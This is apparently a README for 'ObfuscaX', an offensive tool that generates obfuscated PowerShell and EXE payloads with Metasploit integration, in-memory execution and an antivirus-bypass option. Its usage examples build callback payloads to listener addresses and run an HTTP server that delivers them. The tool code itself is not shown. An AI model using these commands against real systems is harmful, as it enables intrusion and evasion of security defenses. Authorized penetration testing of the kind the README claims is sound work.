# 🔒 ObfuscaX – Payload Obfuscation Framework (BETA)

**ObfuscaX** is a tool for creating and testing **obfuscated payloads** 🔐  
Built for **authorized** penetration testing & security research 🛡️

---

## ✨ Features
- 🌀 Multiple obfuscation modes (static & dynamic)
- ⚙️ Payload generator (PS1, EXE, etc.)
- 🔗 Metasploit integration
- 🧠 In-memory execution (no disk artifacts)
- 💻 Simple command-line interface

---

## 📦 Installation

**Requirements**  
- 🐍 Python 3.13+  
- 💣 Metasploit Framework *(optional)*  
- 🖥️ Linux / Windows (WSL supported)  

**Setup**
```bash
git clone https://github.com/blueiewu/ObfuscaX.git
cd ObfuscaX
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt
```
🚀 Usage

Generate a payload
```
python src/obfuscator.py --generate --type ps1 \
  --lhost 192.168.1.10 --lport 4444 \
  --obf dynamic --in-memory
```
Batch mode (from config file)
```
python src/obfuscator.py --batch config.json
```
Run HTTP delivery server

```
python src/obfuscator.py --http-server --http-port 8443 --require-token MYTOKEN

```

📜 Example Config (config.json)

```
{
  "payloads": [
    {
      "type": "exe",
      "parameters": {
        "lhost": "10.0.0.5",
        "lport": 8080,
        "obf": "static",
        "av_bypass": true
      },
      "output": "output/payload.exe"
    }
  ]
}

```
⚠️ Notes

   - ✅ Use only with permission

   - 🧪 Perfect for lab testing & training

   - 🐞 Check logs/ for troubleshooting info

📄 License

   - MIT License © 2025 blueiewu
